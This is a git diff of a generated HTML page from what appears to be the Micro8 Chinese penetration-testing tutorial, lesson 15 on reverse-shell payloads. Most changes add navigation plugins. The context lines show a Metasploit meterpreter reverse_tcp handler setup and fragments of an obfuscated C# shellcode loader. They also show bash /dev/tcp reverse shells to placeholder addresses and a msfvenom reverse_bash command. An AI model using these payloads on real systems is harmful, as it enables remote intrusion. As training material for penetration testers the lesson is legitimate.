@@ -25,11 +25,23 @@
                 
             
                 
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-expandable-chapters-small/expandable-chapters-small.css">
+                
+            
+                
                 <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
                 
             
                 
                 <link rel="stylesheet" href="../gitbook/gitbook-plugin-page-footer-ex/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-anchors/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
                 
             
                 
@@ -174,14 +186,14 @@
             
         </li>
     
-        <li class="chapter " data-level="1.4" >
+        <li class="chapter " data-level="1.4" data-path="../Contents.html">
             
-                <span>
+                <a href="../Contents.html">
             
                     
                     第一章：生
             
-                </span>
+                </a>
             
 
             
@@ -1869,10 +1881,10 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <p>&#x5728;&#x5B9E;&#x6218;&#x4E2D;&#x53EF;&#x80FD;&#x4F1A;&#x9047;&#x5230;&#x5404;&#x79CD;&#x8BC9;&#x6C42; payload&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x80FD;&#x9047;&#x5230;&#x5404;&#x79CD;&#x5B9E;&#x9645;&#x95EE;&#x9898;&#xFF0C;&#x5982;&#x6740;&#x6BD2;&#x8F6F;&#x4EF6;&#xFF0C;&#x9632;&#x706B;&#x5899;&#x62E6;&#x622A;&#xFF0C;&#x7279;&#x5B9A;&#x7AEF;&#x53E3;&#x901A;&#x9053;&#xFF0C;&#x96A7;&#x9053;&#x7B49;&#x95EE;&#x9898;&#x3002;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x6839;&#x636E;&#x7B2C;&#x5341;&#x8BFE;&#x8865;&#x5145;&#x5176;&#x4E2D;&#x90E8;&#x5206;&#xFF0C;&#x5176;&#x4ED6;&#x5185;&#x5BB9;&#x540E;&#x7EED;&#x8865;&#x5145;&#x3002;</p>
+                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-anchor"></i><ul><ul><ul><li><span class="title-icon fa fa-hand-o-right"></span><a href="#1&#x3001;c-payload"><b></b>1&#x3001;C#-payload</a></li><li><span class="title-icon fa fa-hand-o-right"></span><a href="#2&#x3001;bash-payload"><b></b>2&#x3001;Bash-payload</a></li><li><span class="title-icon fa fa-hand-o-right"></span><a href="#&#x9644;&#x5F55;&#xFF1A;"><b></b>&#x9644;&#x5F55;&#xFF1A;</a></li></ul></ul></ul></div><a href="#" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><p>&#x5728;&#x5B9E;&#x6218;&#x4E2D;&#x53EF;&#x80FD;&#x4F1A;&#x9047;&#x5230;&#x5404;&#x79CD;&#x8BC9;&#x6C42; payload&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x80FD;&#x9047;&#x5230;&#x5404;&#x79CD;&#x5B9E;&#x9645;&#x95EE;&#x9898;&#xFF0C;&#x5982;&#x6740;&#x6BD2;&#x8F6F;&#x4EF6;&#xFF0C;&#x9632;&#x706B;&#x5899;&#x62E6;&#x622A;&#xFF0C;&#x7279;&#x5B9A;&#x7AEF;&#x53E3;&#x901A;&#x9053;&#xFF0C;&#x96A7;&#x9053;&#x7B49;&#x95EE;&#x9898;&#x3002;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x6839;&#x636E;&#x7B2C;&#x5341;&#x8BFE;&#x8865;&#x5145;&#x5176;&#x4E2D;&#x90E8;&#x5206;&#xFF0C;&#x5176;&#x4ED6;&#x5185;&#x5BB9;&#x540E;&#x7EED;&#x8865;&#x5145;&#x3002;</p>
 <p>&#x8FD9;&#x6B21;&#x4E3B;&#x8981;&#x8865;&#x5145;&#x4E86; C#&#xFF0C;Bash</p>
 <p>ps:&#x5728;&#x7EBF;&#x4EE3;&#x7801;&#x9AD8;&#x4EAE;&#xFF1A;<a href="http://tool.oschina.net/highlight" target="_blank">http://tool.oschina.net/highlight</a></p>
-<h3 id="1&#x3001;c-payload">1&#x3001;C#-payload</h3>
+<h3 id="1&#x3001;c-payload"><a name="1&#x3001;c-payload" class="anchor-navigation-ex-anchor" href="#1&#x3001;c-payload"><i class="fa fa-link" aria-hidden="true"></i></a><a name="1&#x3001;c-payload" class="plugin-anchor" href="#1&#x3001;c-payload"><i class="fa fa-link" aria-hidden="true"></i></a>1&#x3001;C#-payload</h3>
 <pre class="language-"><code class="lang-bash">msf <span class="token operator">&gt;</span> use exploit/multi/handler
 msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp 
 payload <span class="token operator">=</span><span class="token operator">&gt;</span> windows/meterpreter/reverse_tcp
@@ -1917,7 +1929,7 @@ SocketType<span class="token punctuation">.</span>Stream<span class="token punct
 <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span><span class="token class-name">IntPtr</span> CApwDwK<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> uzGJUddCYTd<span class="token punctuation">)</span>&#x37E;
 </code></pre>
 <p><img src="media/926b5570b97743dcfdc212edb6604589.jpg" alt=""></p>
-<h3 id="2&#x3001;bash-payload">2&#x3001;Bash-payload</h3>
+<h3 id="2&#x3001;bash-payload"><a name="2&#x3001;bash-payload" class="anchor-navigation-ex-anchor" href="#2&#x3001;bash-payload"><i class="fa fa-link" aria-hidden="true"></i></a><a name="2&#x3001;bash-payload" class="plugin-anchor" href="#2&#x3001;bash-payload"><i class="fa fa-link" aria-hidden="true"></i></a>2&#x3001;Bash-payload</h3>
 <pre class="language-"><code class="lang-bash">i <span class="token operator">&gt;</span><span class="token operator">&amp;</span> /dev/tcp/xx.xx.xx.xx/xx 0<span class="token operator">&gt;</span><span class="token operator">&amp;</span>1
 </code></pre>
 <p><img src="media/49ee03061e17179d4022d4fc02df4da6.jpg" alt="">  </p>
@@ -1925,7 +1937,7 @@ SocketType<span class="token punctuation">.</span>Stream<span class="token punct
 <span class="token function">cat</span> <span class="token operator">&lt;</span><span class="token operator">&amp;</span>5 <span class="token operator">|</span> <span class="token keyword">while</span> <span class="token function">read</span> line&#x37E; <span class="token keyword">do</span> <span class="token variable">$line</span> 2<span class="token operator">&gt;</span><span class="token operator">&amp;</span>5 <span class="token operator">&gt;</span><span class="token operator">&amp;</span>5&#x37E;done
 </code></pre>
 <p><img src="media/9b61ec08224188e6d2e172a47df7861a.jpg" alt=""></p>
-<h3 id="&#x9644;&#x5F55;&#xFF1A;">&#x9644;&#x5F55;&#xFF1A;</h3>
+<h3 id="&#x9644;&#x5F55;&#xFF1A;"><a name="&#x9644;&#x5F55;&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x9644;&#x5F55;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x9644;&#x5F55;&#xFF1A;" class="plugin-anchor" href="#&#x9644;&#x5F55;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x9644;&#x5F55;&#xFF1A;</h3>
 <p>msfvenom &#x751F;&#x6210; bash</p>
 <pre class="language-"><code class="lang-bash">root@John:~<span class="token comment"># msfvenom -p cmd/unix/reverse_bash LHOST=xx.xx..xx.xx LPORT=xx &gt; -f raw &gt; payload.sh</span>
 </code></pre>
@@ -1977,7 +1989,7 @@ SocketType<span class="token punctuation">.</span>Stream<span class="token punct
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"第十五课：基于第十课补充payload2","level":"1.4.15","depth":2,"next":{"title":"第十六课：红蓝对抗渗透测试1","level":"1.4.16","depth":2,"path":"Chapter1/16_红蓝对抗渗透测试1.md","ref":"Chapter1/16_红蓝对抗渗透测试1.md","articles":[]},"previous":{"title":"第十四课：基于第十课补充payload1","level":"1.4.14","depth":2,"path":"Chapter1/14_基于第十课补充payload1.md","ref":"Chapter1/14_基于第十课补充payload1.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","prism","-sharing","sharing-plus","-expandable-chapters-small","theme-comscore","splitter","simple-page-toc","-copy-code-button","github-buttons","page-footer-ex","donate","ad","baidu-tongji","ga","livereload"],"root":".","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"prism":{"css":["prism-themes/themes/prism-darcula.css"]},"ad":{"contentBottom":"","contentTop":"<font size=\"6\"> 专注 APT 攻击与防御 </font>"},"livereload":{},"baidu-tongji":{"url":"https://hm.baidu.com/hm.js","token":"b03e1a3682665e9218213dc9e1b5a428"},"simple-page-toc":{"maxDepth":3,"skipFirstH1":true},"page-footer-ex":{"copyright":"Copyright © 2019 Micro8. All Rights Reserved. 遵循 [知识共享 署名-非商业性使用 4.0 协议发布](https://creativecommons.org/licenses/by-nc/4.0/deed.zh)","markdown":true,"update_format":"YYYY-MM-DD","update_label":"修订时间："},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"donate":{"alipay":"","alipayText":"支付宝打赏","button":"赞赏码","title":"有读者问赞赏码，如下，自愿：","wechat":"./dashang.png","wechatText":""},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-comscore":{},"github-buttons":{"buttons":[{"user":"micro8","repo":"Micro8-HTML","type":"star","size":"small","count":true}]},"ga":{"configuration":"auto","token":"UA-135003278-1"},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","instapaper","linkedin","pocket","stumbleupon","douban"],"douban":false,"facebook":false,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"search-plus":{}},"theme":"default","author":"Micro8 系列作者","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Micro8 系列教程","language":"zh-hans","links":{"sidebar":{"Micropoor":"https://micropoor.blogspot.com","Github Micro8":"https://github.com/micro8"}},"gitbook":"*","description":"Micro8"},"file":{"path":"Chapter1/15_基于第十课补充payload2.md","mtime":"2019-02-25T12:31:34.273Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-02-27T08:37:19.413Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"第十五课：基于第十课补充payload2","level":"1.4.15","depth":2,"next":{"title":"第十六课：红蓝对抗渗透测试1","level":"1.4.16","depth":2,"path":"Chapter1/16_红蓝对抗渗透测试1.md","ref":"Chapter1/16_红蓝对抗渗透测试1.md","articles":[]},"previous":{"title":"第十四课：基于第十课补充payload1","level":"1.4.14","depth":2,"path":"Chapter1/14_基于第十课补充payload1.md","ref":"Chapter1/14_基于第十课补充payload1.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","prism","-sharing","sharing-plus","expandable-chapters-small","theme-comscore","splitter","github-buttons","page-footer-ex","anchors","anchor-navigation-ex","donate","ad","baidu-tongji","ga"],"root":".","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"prism":{"css":["prism-themes/themes/prism-darcula.css"]},"ad":{"contentBottom":"","contentTop":"<font size=\"6\"> 专注 APT 攻击与防御 </font>"},"baidu-tongji":{"url":"https://hm.baidu.com/hm.js","token":"b03e1a3682665e9218213dc9e1b5a428"},"page-footer-ex":{"copyright":"Copyright © 2019 Micro8. All Rights Reserved. 遵循 [知识共享 署名-非商业性使用 4.0 协议发布](https://creativecommons.org/licenses/by-nc/4.0/deed.zh)","markdown":true,"update_format":"YYYY-MM-DD","update_label":"修订时间："},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"donate":{"alipay":"","alipayText":"支付宝打赏","button":"赞赏码","title":"有读者问赞赏码，如下，自愿：","wechat":"./dashang.png","wechatText":""},"fontsettings":{"theme":"white","family":"sans","size":2},"anchor-navigation-ex":{"associatedWithSummary":false,"float":{"floatIcon":"fa fa-anchor","level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right","showLevelIcon":true},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":false},"theme-comscore":{},"github-buttons":{"buttons":[{"user":"micro8","repo":"Micro8-HTML","type":"star","size":"small","count":true}]},"expandable-chapters-small":{},"ga":{"configuration":"auto","token":"UA-135003278-1"},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","instapaper","linkedin","pocket","stumbleupon","douban"],"douban":false,"facebook":false,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"anchors":{},"search-plus":{}},"theme":"default","author":"Micro8 系列作者","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Micro8 系列教程","language":"zh-hans","links":{"sidebar":{"Micropoor":"https://micropoor.blogspot.com","Github Micro8":"https://github.com/micro8"}},"gitbook":"*","description":"Micro8"},"file":{"path":"Chapter1/15_基于第十课补充payload2.md","mtime":"2019-02-25T12:31:34.273Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-03-01T13:38:56.930Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
@@ -1996,6 +2008,10 @@ SocketType<span class="token punctuation">.</span>Stream<span class="token punct
     
         
         <script src="../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-expandable-chapters-small/expandable-chapters-small.js"></script>
         
     
         
@@ -2020,10 +2036,6 @@ SocketType<span class="token punctuation">.</span>Stream<span class="token punct
     
         
         <script src="../gitbook/gitbook-plugin-ga/plugin.js"></script>
-        
-    
-        
-        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
         
     
         
